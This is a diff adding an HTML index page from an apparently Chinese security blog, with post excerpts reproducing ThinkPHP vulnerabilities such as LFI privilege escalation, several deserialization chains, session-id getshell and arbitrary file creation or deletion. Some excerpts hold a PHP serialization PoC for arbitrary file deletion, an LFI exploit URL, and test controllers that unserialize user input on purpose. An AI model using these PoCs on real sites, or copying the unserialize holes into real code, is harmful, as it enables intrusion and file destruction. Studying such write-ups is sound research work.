@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/34/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-Thinkphp shop/Thinkphp Shop 供应商后台本地文件包含导致权限提升" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp%20shop/Thinkphp%20Shop%20%E4%BE%9B%E5%BA%94%E5%95%86%E5%90%8E%E5%8F%B0%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.478Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphp-Shop-供应商后台本地文件包含导致权限提升"><a href="#Thinkphp-Shop-供应商后台本地文件包含导致权限提升" class="headerlink" title="Thinkphp Shop 供应商后台本地文件包含导致权限提升"></a>Thinkphp Shop 供应商后台本地文件包含导致权限提升</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="1、用户个人资料修改处上传图片"><a href="#1、用户个人资料修改处上传图片" class="headerlink" title="1、用户个人资料修改处上传图片"></a>1、用户个人资料修改处上传图片</h3><p><a target="_blank" rel="noopener" href="http://www.0-sec.org/Home/User/info.html">http://www.0-sec.org/Home/User/info.html</a></p>
+<h3 id="2、上传一张正常图片，并在图片末尾加上一句话"><a href="#2、上传一张正常图片，并在图片末尾加上一句话" class="headerlink" title="2、上传一张正常图片，并在图片末尾加上一句话"></a>2、上传一张正常图片，并在图片末尾加上一句话</h3><h3 id="3、返回shell"><a href="#3、返回shell" class="headerlink" title="3、返回shell"></a>3、返回shell</h3><p><a target="_blank" rel="noopener" href="http://www.0-sec.org/supplier/order/delivery/_print?template=public/upload/user/4575/head%5C_pic/5989ee42cc5992e64a60c52b0cbb7602.png&amp;w=phpi">http://www.0-sec.org/supplier/order/delivery\_print?template=public/upload/user/4575/head\_pic/5989ee42cc5992e64a60c52b0cbb7602.png&amp;w=phpi</a></p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Thinkphp%20shop/Thinkphp%20Shop%20%E4%BE%9B%E5%BA%94%E5%95%86%E5%90%8E%E5%8F%B0%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp%20shop/Thinkphp%20Shop%20%E4%BE%9B%E5%BA%94%E5%95%86%E5%90%8E%E5%8F%B0%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" data-id="cl5c2qwsn00ixy8v1a3hvaeo6" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Thinkphp/Thinkphp 反序列化漏洞/Thinkphp 6.0._-dev 反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%206.0._-dev%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.367Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphp-6-0-dev-反序列化漏洞"><a href="#Thinkphp-6-0-dev-反序列化漏洞" class="headerlink" title="Thinkphp 6.0.*-dev 反序列化漏洞"></a>Thinkphp 6.0.*-dev 反序列化漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>所有Thinkphp版本下载链接</p>
+<p><a target="_blank" rel="noopener" href="https://packagist.org/packages/topthink/framework">https://packagist.org/packages/topthink/framework</a></p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre><code>composer create-project topthink/think=6.0.*-dev v6.0
+</code></pre>
+<h3 id="poc演示截图"><a href="#poc演示截图" class="headerlink" title="poc演示截图"></a>poc演示截图</h3><p><img src="/resource/Thinkphp6.0.*-dev%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%206.0._-dev%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%206.0._-dev%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwwn00j0y8v117600927" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Thinkphp/Thinkphp 反序列化漏洞/Thinkphp 5.2._-dev 反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.2._-dev%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.364Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphp-5-2-dev-反序列化漏洞"><a href="#Thinkphp-5-2-dev-反序列化漏洞" class="headerlink" title="Thinkphp 5.2.*-dev 反序列化漏洞"></a>Thinkphp 5.2.*-dev 反序列化漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>所有Thinkphp版本下载链接</p>
+<p><a target="_blank" rel="noopener" href="https://packagist.org/packages/topthink/framework">https://packagist.org/packages/topthink/framework</a></p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre><code>composer create-project topthink/think=5.2.*-dev v5.2
+</code></pre>
+<h3 id="poc演示截图"><a href="#poc演示截图" class="headerlink" title="poc演示截图"></a>poc演示截图</h3><p><img src="/resource/Thinkphp5.2.*-dev%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.2._-dev%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.2._-dev%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwwo00j1y8v17yzx5dpf" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Thinkphp/Thinkphp 反序列化漏洞/Thinkphp 5.1.37 反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.1.37%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.362Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphp-5-1-37-反序列化漏洞"><a href="#Thinkphp-5-1-37-反序列化漏洞" class="headerlink" title="Thinkphp 5.1.37 反序列化漏洞"></a>Thinkphp 5.1.37 反序列化漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>所有Thinkphp版本下载链接</p>
+<p><a target="_blank" rel="noopener" href="https://packagist.org/packages/topthink/framework">https://packagist.org/packages/topthink/framework</a></p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre><code>composer create-project topthink/think=5.1.37 v5.1.37
+</code></pre>
+<h3 id="poc演示截图"><a href="#poc演示截图" class="headerlink" title="poc演示截图"></a>poc演示截图</h3><p><img src="/resource/Thinkphp5.1.37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.1.37%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.1.37%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwwp00j2y8v1ekqi715i" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Thinkphp/Thinkphp 反序列化漏洞/Thinkphp 5.1.1 反序列化pop链构造" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.1.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%9E%84%E9%80%A0/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.360Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphp-5-1-1-反序列化pop链构造"><a href="#Thinkphp-5-1-1-反序列化pop链构造" class="headerlink" title="Thinkphp 5.1.1 反序列化pop链构造"></a>Thinkphp 5.1.1 反序列化pop链构造</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>5.1.1的代码实现和5.1.38不同，于是就有了这篇文章</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Thinkphp 5.1.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>这个漏洞的起点是一个任意文件删除漏洞$this-&gt;files内容没有过滤，可以传入任意数值。</p>
+<pre><code>/thinkphp/library/think/process/pipes/Windows.php
+public function __destruct()
+    &#123;
+        $this-&gt;close();
+        $this-&gt;removeFiles();
+    &#125;
+
+ private function removeFiles()
+    &#123;
+        foreach ($this-&gt;files as $filename) &#123;
+            if (file_exists($filename)) &#123;
+                @unlink($filename);
+            &#125;
+        &#125;
+        $this-&gt;files = [];
+    &#125;
+</code></pre>
+<p>poc</p>
+<pre><code>&lt;?php
+namespace think\process\pipes;
+class Windows
+&#123;
+    private $files = [];
+    public function __construct()
+    &#123;
+        $this-&gt;files = [&#39;1.php&#39;];
+    &#125;
+&#125;
+use think\process\pipes\Windows;
+echo base64_encode(serialize(new Windows()));
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.1.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%9E%84%E9%80%A0/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.1.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%9E%84%E9%80%A0/" data-id="cl5c2qwwl00izy8v11n73a1go" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Thinkphp/Thinkphp 反序列化漏洞/Thinkphp 5.0.24 反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.357Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphp-5-0-24-反序列化（任意文件写入）漏洞"><a href="#Thinkphp-5-0-24-反序列化（任意文件写入）漏洞" class="headerlink" title="Thinkphp 5.0.24 反序列化（任意文件写入）漏洞"></a>Thinkphp 5.0.24 反序列化（任意文件写入）漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该漏洞只能在linux服务器上使用，win无法适用。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Thinkphp 5.0.24</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这个漏洞是框架的反序列化漏洞，只有二次开发实现了反序列化才可以利用，所以先构造漏洞代码，在/application/index/controller/Index.php中添加如下代码</p>
+<pre><code>class Index
+&#123;
+    public function index()
+    &#123;
+        echo &quot;Welcome thinkphp 5.0.24&quot;;
+        unserialize(base64_decode($_GET[&#39;a&#39;]));
+    &#125;
+&#125;
+</code></pre>
+<p>Thinkphp<br>5.0.x反序列化最后触发RCE，要调用的<code>Request</code>类<code>__call</code>方法，所以直接找可用的<code>__call</code>方法</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwy900j3y8v1gmrph6rn" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Thinkphp/Thinkphp 6.x 漏洞/Thinkphp _ 6.0.2 session id未作过滤导致getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%206.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%20_%206.0.2%20session%20id%E6%9C%AA%E4%BD%9C%E8%BF%87%E6%BB%A4%E5%AF%BC%E8%87%B4getshell/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.229Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphp-lt-6-0-2-session-id未作过滤导致getshell"><a href="#Thinkphp-lt-6-0-2-session-id未作过滤导致getshell" class="headerlink" title="Thinkphp &lt; 6.0.2 session id未作过滤导致getshell"></a>Thinkphp &lt; 6.0.2 session id未作过滤导致getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Thinkphp &lt; 6.0.2</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>通过diff<br>github上面的6.0.1和6.0.2的代码可以发现，6.0.1在设置<code>session id</code>时未对值进行<code>ctype_alnum()</code>校验，从而导致可以传入任意字符。</p>
+<p><img src="/resource/Thinkphp%3C6.0.2sessionid%E6%9C%AA%E4%BD%9C%E8%BF%87%E6%BB%A4%E5%AF%BC%E8%87%B4getshell/media/rId25.png"></p>
+<p>传入任意字符会有什么危害？一般来说程序可能会以session<br>id作为文件名来创建对应的session文件，但是到目前为止这只是猜测。看一下保存session是怎么写的。</p>
+<pre><code>public function save(): void
+&#123;
+    $this-&gt;clearFlashData();
+
+    $sessionId = $this-&gt;getId();
+
+    if (!empty($this-&gt;data)) &#123;
+        $data = $this-&gt;serialize($this-&gt;data);
+
+        $this-&gt;handler-&gt;write($sessionId, $data);
+    &#125; else &#123;
+        $this-&gt;handler-&gt;delete($sessionId);
+    &#125;
+
+    $this-&gt;init = false;
+&#125;
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Thinkphp/Thinkphp%206.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%20_%206.0.2%20session%20id%E6%9C%AA%E4%BD%9C%E8%BF%87%E6%BB%A4%E5%AF%BC%E8%87%B4getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%206.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%20_%206.0.2%20session%20id%E6%9C%AA%E4%BD%9C%E8%BF%87%E6%BB%A4%E5%AF%BC%E8%87%B4getshell/" data-id="cl5c2qwsm00iuy8v18gj13fn5" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Thinkphp/Thinkphp 6.x 漏洞/Thinkphp 6.1 任意文件创建&amp;删除漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%206.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%206.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA&%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.227Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphp-6-1-任意文件创建-amp-删除漏洞"><a href="#Thinkphp-6-1-任意文件创建-amp-删除漏洞" class="headerlink" title="Thinkphp 6.1 任意文件创建&amp;删除漏洞"></a>Thinkphp 6.1 任意文件创建&amp;删除漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>漏洞允许攻击者在启用session的目标环境下创建任意文件以及删除任意文件（仅Windows下），在特定情况下还可以getshell。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>ThinkPHP&lt;6.0.2</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>ThinkPHP6.0.1+PHP7.2+Windows</p>
+<pre><code>composer create-project topthink/think tp6.0.1
+#修改json后
+composer update
+</code></pre>
+<ol>
+<li> <strong>开启session</strong></li>
+</ol>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Thinkphp/Thinkphp%206.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%206.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA&%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%206.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%206.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA&%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwsk00iry8v1exw2di14" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Thinkphp/Thinkphp 6.x 漏洞/Thinkphp 6.0 任意文件写入pop链" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%206.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%206.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5pop%E9%93%BE/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.225Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphp-6-0-任意文件写入pop链"><a href="#Thinkphp-6-0-任意文件写入pop链" class="headerlink" title="Thinkphp 6.0 任意文件写入pop链"></a>Thinkphp 6.0 任意文件写入pop链</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>需要知晓绝对路径</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Thinkphp 6.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>ThinkPHP6.0.2</p>
+<p>PHP7.2</p>
+<pre><code>&lt;?php
+namespace app\controller;
+use app\BaseController;
+
+class Index extends BaseController
+
+    public function test()&#123;
+        echo base64_decode($_POST[&#39;payload&#39;]);
+        $payload = unserialize(base64_decode($_POST[&#39;payload&#39;]));
+    &#125;
+&#125;
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Thinkphp/Thinkphp%206.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%206.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5pop%E9%93%BE/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%206.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%206.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5pop%E9%93%BE/" data-id="cl5c2qwsm00ity8v17z7qd02h" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Thinkphp/Thinkphp 6.x 漏洞/ThinkAdmin未授权列目录任意文件读取(CVE-2020-25540)漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%206.x%20%E6%BC%8F%E6%B4%9E/ThinkAdmin%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%97%E7%9B%AE%E5%BD%95%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96(CVE-2020-25540)%E6%BC%8F%E6%B4%9E/" class="article-date">
